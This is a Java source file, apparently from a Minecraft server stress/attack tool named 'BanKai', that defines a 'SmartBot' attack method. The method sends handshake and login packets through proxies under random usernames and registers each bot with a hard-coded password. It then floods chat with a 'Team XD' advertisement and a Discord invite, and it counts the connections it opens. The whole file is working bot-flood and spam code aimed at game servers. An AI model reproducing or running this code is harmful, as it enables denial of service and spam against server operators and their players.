package dev.xdmeow.core.methods.impl;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.concurrent.TimeUnit;
import java.util.zip.Deflater;

import dev.xdmeow.BanKai;
import dev.xdmeow.core.NettyBootstrap;
import dev.xdmeow.core.methods.IMethod;
import dev.xdmeow.core.util.helper.RandomUtils;
import dev.xdmeow.core.util.mcutil.PacketUtils;
import dev.xdmeow.core.util.mcutil.ext.Handshake;
import dev.xdmeow.core.util.mcutil.ext.LoginRequest;
import dev.xdmeow.core.util.proxy.Proxy;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class SmartBot implements IMethod{

    private byte[] handshake = new Handshake(BanKai.protocol,BanKai.srvRecord,BanKai.port,2).getWrappedPacket();

    @Override
    public void accept(Channel channel, Proxy proxy) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake));
        ByteBuf b = Unpooled.buffer();
        ByteBufOutputStream bout = new ByteBufOutputStream(b);
        ByteBuf b2 = Unpooled.buffer();
        ByteBufOutputStream bout2 = new ByteBufOutputStream(b2);
        ByteBuf b3 = Unpooled.buffer();
        ByteBufOutputStream bout3 = new ByteBufOutputStream(b3);
        channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(String.valueOf((new StringBuilder()).append(RandomUtils.randomString(8)).append("_XD")))).getWrappedPacket()));
        channel.writeAndFlush(b);
        channel.writeAndFlush(bout);
        try {
            try {
              TimeUnit.MILLISECONDS.sleep(1500L);
            }
            catch (InterruptedException e) {
              e.printStackTrace();
            }
            for (int l = 0; l < 3; l++) {
              writePacket(compress(PacketUtils.createChatPacket("/register XDXD6969 XDXD6969"), 0), bout3);
              writePacket(compress(PacketUtils.createChatPacket("/register XDXD6969"), 0), bout3);
              writePacket(compress(PacketUtils.createChatPacket("/login XDXD6969"), 0), bout3);
            }
  
          } catch (IOException ioException) {
            ioException.printStackTrace();
          }

          channel.writeAndFlush(b3);
          channel.writeAndFlush(bout3);

          try {
            TimeUnit.MILLISECONDS.sleep(500L);
          }
          catch (InterruptedException e) {
            e.printStackTrace();
          }
          try {
            for (int l = 0; l < 3; l++) {
              writePacket(compress(PacketUtils.createChatPacket("- "+RandomUtils.randomString(4)+" -|> Team XD On Top || discord . gg / SEn4ycTXR8 <|- "+RandomUtils.randomString(4)+" -"), 0), bout2);
            }
          }
          catch (IOException ioException) {
            ioException.printStackTrace();
          }
          channel.writeAndFlush(b2);
          channel.writeAndFlush(bout2);
    }
    
    public byte[] compress(byte[] packet, int threshold) throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        byte[] buffer = new byte[8192];
        if (packet.length >= threshold && threshold > 0) {
          byte[] data = new byte[packet.length];
          System.arraycopy(packet, 0, data, 0, packet.length);
          PacketUtils.writeVarInt(out, data.length);
          Deflater def = new Deflater();
          def.setInput(data, 0, data.length);
          def.finish();
          while (!def.finished()) {
            int i = def.deflate(buffer);
            out.write(buffer, 0, i);
          }
          def.reset();
        } else {
          PacketUtils.writeVarInt(out, 0);
          out.write(packet);
        }
        out.close();
        return bytes.toByteArray();
      }

      public static void writePacket(byte[] packetData, ByteBufOutputStream out) throws IOException {
        writeVarInt(packetData.length, out);
        out.write(packetData);
      }

      public static void writeVarInt(int value, ByteBufOutputStream out) throws IOException {
        while ((value & 0xFFFFFF80) != 0) {
          out.writeByte(value & 0x7F | 0x80);
          value >>>= 7;
        }
        out.writeByte(value);
        ++NettyBootstrap.currentConnections;
        ++NettyBootstrap.totalConnections;
      }
}
